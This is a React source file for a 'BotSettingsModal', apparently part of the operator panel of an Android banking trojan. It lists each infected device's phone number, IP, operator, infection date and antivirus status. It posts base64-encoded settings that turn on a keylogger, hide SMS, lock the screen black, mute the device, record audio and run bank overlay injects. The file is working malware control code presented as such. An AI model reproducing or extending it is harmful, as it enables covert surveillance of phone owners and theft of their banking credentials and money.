import React from 'react';
import SettingsContext from '../../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
import { try_eval } from '../../serviceF';
import OnOffSwitcher from './OnOffSwitcher';
import InjectListNamer from './InjectListNamer';
import EditCommentUniversal from '../EditCommentUniversal';
import { throws } from 'assert';

class BotSettingsModal extends React.Component {
    constructor(props)
    {
        super(props);
        this.state = {
            myObjJS: null,
            endless_start: null,
            record_call: null,
            hideSMS: null,
            lockDevice: null,
            offSound: null,
            keylogger: null,
            activeInjection: null,
            banks: null,
            BotID: SettingsContext.CurrentSetBot,
            Android: null,
            tag: null,
            country: null,
            dateInfection: null,
            ip: null,
            operator: null,
            model: null,
            phoneNumber: null,
            commands: null,
            statProtect: null,
            statSMS: null,
            activeDevice: null,
            timeWorking: null,
            statDownloadModule: null,
            statAdmin: null,
            locale: null,
            batteryLevel: null,
            updateSettings: null
        };
    }

    componentWillReceiveProps() {
        if(SettingsContext.start_modul != 'BotSettingsModal'){
            return;
        }
        this.onLoadJson();
    }

    onLoadJson () {
        if(SettingsContext.CurrentSetBot.length < 1) {
            return;
        }
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer('{"sent_request":"settings_client","ID":"' + SettingsContext.CurrentSetBot + '"}').toString('base64')
            }
        });

        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error)){
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}else{
					this.setState({
                        myObjJS: result,
                        endless_start: result.endless_start,
                        record_call: result.record_call,
						hideSMS: result.sms_admin,
						lockDevice: result.lock_admin,
						offSound: result.sound_0,
						keylogger: result.accessibility_focus_logger,
						activeInjection: result.injections_working,
						banks: result.array_bank,
                        BotID: SettingsContext.CurrentSetBot,
                        Android: result.version,
                        tag: result.tag,
                        country: result.country,
                        dateInfection: result.time_registration,
                        ip: result.ip,
                        operator: result.operator,
                        model: result.model,
                        phoneNumber: result.number_sim,
                        commands: new Buffer(result.commands.toString()  == null ? '' : result.commands.toString(), 'base64').toString('utf-8'),
                        statProtect: result.check_protect,
                        statSMS: result.check_sms,
                        activeDevice: result.activeDevice,
                        timeWorking: result.timeWorking,
                        statDownloadModule: result.statDownloadModule,
                        statAdmin: result.statAdmin,
                        locale: result.locale,
                        batteryLevel: result.batteryLevel,
                        updateSettings: result.updateSettings
					});
				}
			
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error bot settings. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    ChangeSettings(newComment) {
        this.props.BotListForceUpdate();
    }

    HideThisModal() {
        try_eval('$("#BotSettingsModal").modal("hide");');
    }

    componentDidUpdate() {
        try_eval('UpdateToolTips();');
    }

    componentDidMount() {
        try_eval('UpdateToolTips();');
    }

    callbackBtn(Value, BtnParam) {
        if(BtnParam == "endless_start"){
            this.state.endless_start = Value;
        }
        if(BtnParam == "record_call"){
            this.state.record_call = Value;
        }
        if(BtnParam == "hideSMS"){
            this.state.hideSMS = Value;
        }
        else if(BtnParam == "lockDevice"){
            this.state.lockDevice = Value;
        }
        else if(BtnParam == "offSound"){
            this.state.offSound = Value;
        }
        else if(BtnParam == "keylogger"){
            this.state.keylogger = Value;
        }
        else if(BtnParam == "activeInjection"){
            this.state.activeInjection = Value;
        }
        this.SaveSettings();
    }

    SaveSettings() {
        if(this.state.endless_start==null)this.state.endless_start=0;
        if(this.state.record_call==null)this.state.record_call=0;
        if(this.state.hideSMS==null)this.state.hideSMS=0;
        if(this.state.lockDevice==null)this.state.lockDevice=0;
        if(this.state.offSound==null)this.state.offSound=0;
        if(this.state.keylogger==null)this.state.keylogger=0;
        
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {//{"sent_request":"editBotSettings","idbot":"123123","hideSMS":"1","lockDevice":"1","offSound":"1","keylogger":"1","activeInjection":":inj1:inj2"}
                'params': new Buffer(
                    '{"' + 
                    'sent_request":"change_settings_client",' + 
                    '"index01":"0x001",' + 
                    '"lock_admin":"' + this.state.lockDevice + '",' + 
                    '"sound_0":"' + this.state.offSound + '",' + 
                    '"injections_working":"' + this.state.activeInjection + '",' +
                    '"index001":"0x001",' + 
                    '"ID":"' + SettingsContext.CurrentSetBot + '",' + 
                    '"accessibility_focus_logger":"' + this.state.keylogger + '",' + 
                    '"endless_start":"'+ this.state.endless_start+'",' + 
                    '"record_call":"'+ this.state.record_call+'",' + 
                    '"index001":"0x001",' + 
                    '"sms_admin":"' + this.state.hideSMS + '"' + 
                    '}').toString('base64')
            }
        });

        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error))
				{
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else
				{
					SettingsContext.ShowToast('success', 'Settings saved complete!' + result['message']);
					this.onLoadJson();
				}
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error save bot settings. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    render() {
        return (
          //<!-- Modal -->
            <div class="modal fade" id="BotSettingsModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
                <div class="modal-dialog modal-lg" role="document">
                    <div class="modal-content ">
                    <div class="modal-header">
                       <center> <h5>Settings/Details</h5></center>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                        </button>
                    </div>


                    <div class="div1">
                            <div class="div2">
                                <div class="contextDetails">
                                    <a><b>ID: </b>{SettingsContext.CurrentSetBot}</a><br/>
                                    <a><b>Android version: </b>{this.state.Android}</a><br/>
                                    <a><b>Model: </b>{this.state.model}</a><br/>
                                    <a><b>Operator: </b>{this.state.operator}</a><br/>
                                    <a><b>Number: </b>{this.state.phoneNumber}</a><br/>
                                    <a><b>Country: </b>{this.state.country}</a><br/>   
                                    <a><b>System locale: </b>{this.state.locale}</a><br/> 
                                    <a><b>Battery level: </b>{this.state.batteryLevel}</a><br/>
                                    <a><b>IP: </b>{this.state.ip}</a><br/>
                                    <a><b>Date Infection: </b>{this.state.dateInfection}</a><br/>
                                    <a><b>AV Protection: </b>{this.state.statProtect==1 ? 'on':'off'}</a><br/>
                                    <a><b>Background service running time: </b>{this.state.timeWorking}</a><br/>
                                    <a><b>Initialization to work: </b>{this.state.statDownloadModule==1 ? 'on':'off'}</a><br/>
                                    <a><b>Admin device: </b>{this.state.statAdmin==1 ? 'on':'off'}</a><br/>
                                    <a><b>Hidden SMS: </b>{this.state.statSMS==1 ? 'on':'off'}</a><br/>
                                    <a><b>Commands: </b><i>{this.state.commands}</i></a>
                                </div>
                            </div>
    
                            <div class="div3">
                                
                                <center><h5>Settings</h5></center>

                                <nav aria-label="breadcrumb">
                                    <ol class="breadcrumb">
                                        <li  aria-current="page">
                                        Disable sound to device <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"offSound"} status={this.state.offSound} />
                                        </li>
                                    </ol>
                                </nav>

                                <nav aria-label="breadcrumb">
                                    <ol class="breadcrumb">
                                        <li aria-current="page">
                                        Lock device(black screen) <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"lockDevice"} status={this.state.lockDevice} />
                                        </li>
                                    </ol>
                                </nav>
                               
                                <nav aria-label="breadcrumb">
                                    <ol class="breadcrumb">
                                        <li aria-current="page">
                                        Enable collection of logs of a keylogger <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"keylogger"} status={this.state.keylogger} />
                                        </li>
                                    </ol>
                                </nav>  
                                <nav aria-label="breadcrumb">
                                    <ol class="breadcrumb">
                                        <li  aria-current="page">
                                        Hide incoming and outgoing SMS <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"hideSMS"} status={this.state.hideSMS}/> 
                                        </li>
                                    </ol>
                                </nav>

                                <nav aria-label="breadcrumb">
                                    <ol class="breadcrumb">
                                        <li  aria-current="page">
                                        Run foreground service(anti-sleep) <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"endless_start"} status={this.state.endless_start}/> 
                                        </li>
                                    </ol>
                                </nav>

                                <nav aria-label="breadcrumb">
                                    <ol class="breadcrumb">
                                        <li  aria-current="page">
                                        Run recording audio(1 file - 15 min)  <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"record_call"} status={this.state.record_call}/> 
                                        </li>
                                    </ol>
                                </nav>


                                <center><h5>Active injects list</h5></center>
                                <br/> <br/> <br/>
                                <InjectListNamer callback={this.callbackBtn.bind(this)} name={"activeInjection"} active={this.state.activeInjection} status={this.state.banks} />
                        
         
                            </div>
                            
                       
                    </div>
                    
                    </div>
                </div>
            </div>
      );
    }
}

export default BotSettingsModal;